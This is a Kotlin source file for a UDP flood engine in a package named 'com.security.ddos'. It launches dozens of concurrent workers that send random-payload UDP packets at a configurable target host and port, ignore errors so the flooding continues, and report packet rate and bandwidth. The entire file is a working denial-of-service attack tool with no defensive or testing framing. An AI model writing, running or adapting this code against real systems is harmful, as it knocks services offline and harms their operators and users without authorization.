package com.security.ddos

import kotlinx.coroutines.*
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress
import java.util.concurrent.atomic.AtomicLong
import kotlin.random.Random

class UDPFloodEngine(
    private val targetHost: String,
    private val targetPort: Int,
    private val threadCount: Int = 50,
    private val packetSize: Int = 512,
    private val durationMs: Long = 60000,
    private val onProgressUpdate: (stats: FloodStats) -> Unit = {}
) {
    private val packetCount = AtomicLong(0)
    private var isRunning = false
    private val scope = CoroutineScope(Dispatchers.Default + Job())

    suspend fun start() {
        isRunning = true
        val startTime = System.currentTimeMillis()

        val workers = List(threadCount) {
            scope.launch(Dispatchers.IO) {
                floodPackets(startTime)
            }
        }

        scope.launch {
            while (isRunning) {
                delay(1000)
                val elapsed = System.currentTimeMillis() - startTime
                val pps = if (elapsed > 0) (packetCount.get() * 1000) / elapsed else 0
                onProgressUpdate(FloodStats(
                    totalPackets = packetCount.get(),
                    packetsPerSecond = pps,
                    elapsedSeconds = elapsed / 1000,
                    bandwidthMBps = (pps * packetSize) / (1024 * 1024)
                ))
            }
        }

        workers.joinAll()
        stop()
    }

    private suspend fun floodPackets(startTime: Long) {
        try {
            val socket = DatagramSocket()
            val targetAddr = InetAddress.getByName(targetHost)

            while (isRunning && (System.currentTimeMillis() - startTime) < durationMs) {
                try {
                    val payload = ByteArray(packetSize)
                    Random.nextBytes(payload)

                    val packet = DatagramPacket(
                        payload,
                        payload.size,
                        targetAddr,
                        targetPort
                    )

                    socket.send(packet)
                    packetCount.incrementAndGet()

                    delay(1)
                } catch (e: Exception) {
                    // Continue flooding
                }
            }

            socket.close()
        } catch (e: Exception) {
            // Socket creation error
        }
    }

    fun stop() {
        isRunning = false
        scope.cancel()
    }

    fun getStats(): FloodStats {
        return FloodStats(
            totalPackets = packetCount.get(),
            packetsPerSecond = 0,
            elapsedSeconds = 0,
            bandwidthMBps = 0
        )
    }
}

data class FloodStats(
    val totalPackets: Long,
    val packetsPerSecond: Long,
    val elapsedSeconds: Long,
    val bandwidthMBps: Long
)
